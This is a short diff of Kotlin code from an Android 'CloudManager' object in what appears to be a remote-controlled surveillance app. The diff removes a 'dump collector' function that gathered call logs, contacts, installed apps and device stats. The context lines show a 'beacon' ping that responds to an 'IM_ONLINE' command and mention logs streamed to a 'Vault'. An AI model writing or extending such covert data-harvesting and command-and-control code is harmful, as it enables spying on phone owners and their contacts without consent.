@@ -268,26 +268,7 @@ object CloudManager {
         }
     }
 
-    // --- INTERNAL DUMP COLLECTOR (FORENSIC MODE) ---
-    fun collectDumpData(ctx: Context): JSONObject {
-        val json = JSONObject()
-        
-        // 1. System Vitals
-        json.put("static", DeviceManager.getStaticInfo(ctx))
-        json.put("health", DeviceManager.getHealthStats(ctx))
-        
-        // 2. STREAM LOGGING RECOVERY
-        json.put("stream_logs_status", "Delegated to Survivor Protocol (Streamed to Vault)")
-        
-        // 3. Persistent Data (The Deep Dive)
-        json.put("calls", PhoneManager.getCallLogs(ctx))
-        json.put("contacts", PhoneManager.getContacts(ctx))
-        json.put("apps", AppListManager.getInstalledApps(ctx))
 
-
-
-        return json
-    }
 
     // --- LIGHTWEIGHT BEACON (For IM_ONLINE command) ---
     fun sendPing(ctx: Context, note: String = "Online", extraData: JSONObject? = null) {
